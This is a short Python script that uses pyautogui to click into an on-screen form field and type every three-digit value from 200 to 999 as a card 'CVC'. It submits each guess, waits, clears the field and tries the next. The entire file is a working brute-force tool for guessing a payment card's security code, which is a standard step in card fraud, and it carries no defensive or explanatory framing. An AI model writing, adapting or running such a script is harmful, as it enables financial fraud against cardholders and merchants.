import pyautogui
import time

textbox_x = 503
textbox_y = 202
confirm_button_x = 568
confirm_button_y = 375

for number in range(200, 1000):
    cvc = f"{number:03}"
    print(f"Trying CVC: {cvc}")

    pyautogui.moveTo(textbox_x, textbox_y, duration=0.5)
    pyautogui.click()
    pyautogui.typewrite(cvc)

    pyautogui.moveTo(confirm_button_x, confirm_button_y, duration=0.5)
    pyautogui.click()

    time.sleep(5)

    pyautogui.moveTo(textbox_x, textbox_y, duration=0.5)
    pyautogui.click()
    pyautogui.hotkey('ctrl', 'a')
    pyautogui.press('backspace')
